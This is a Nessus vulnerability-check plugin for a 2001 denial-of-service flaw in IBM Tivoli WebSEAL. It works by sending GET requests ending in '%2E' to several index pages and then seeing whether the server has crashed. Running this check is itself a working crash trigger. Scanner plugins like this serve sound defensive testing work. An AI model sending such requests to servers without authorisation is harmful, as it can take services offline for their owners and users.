#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CAN
#
# References:
# Date:  11 Dec 2001 09:22:50 -0000
# From: "Matthew Lane" <MatthewL@Janusassociates.com>
# To: bugtraq@securityfocus.com
# Subject: Webseal 3.8
#
# Affected:
# Webseal 3.8
#
# *unconfirmed*

include( 'compat.inc' );

if(description)
{
  script_id(11089);
  script_version ("$Revision: 1.26 $");
  script_cve_id("CVE-2001-1191");
  script_bugtraq_id(3685);
  script_osvdb_id(2089);

  script_name(english:"IBM Tivoli SecureWay WebSEAL Proxy Policy Director Encoded URL DoS");
  script_summary(english:"Request ending with %2E kills WebSeal");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to a denial of service attack.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The remote web server crashes when an URL ending with %2E is requested.

An attacker may use this flaw to cause the server crash continually."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Upgrade to IBM Tivoli SecureWay Policy Director 3.9 or later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(
    attribute:'see_also',
    value:'http://seclists.org/bugtraq/2002/Apr/234'
  );

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/08/18");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/12/11");
 script_cvs_date("$Date: 2016/11/29 20:13:37 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");
  script_dependencie("find_service1.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/ASP");
  exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (! can_host_asp(port:port)) exit(0);

if (http_is_dead(port: port)) exit(0);

url[0] = "/index.html";
url[1] = "/index.htm";
url[2] = "/index.asp";
url[3] = "/";

for (i=0; i<4;i=i+1)
{
 w = http_send_recv3(method:"GET", port: port, item: string(url[i], "%2E"));
 if (isnull(w)) break;
}
# We must close the socket, VNC limits the number of parallel connections
http_disable_keep_alive();

if (http_is_dead(port: port)) { security_warning(port); }
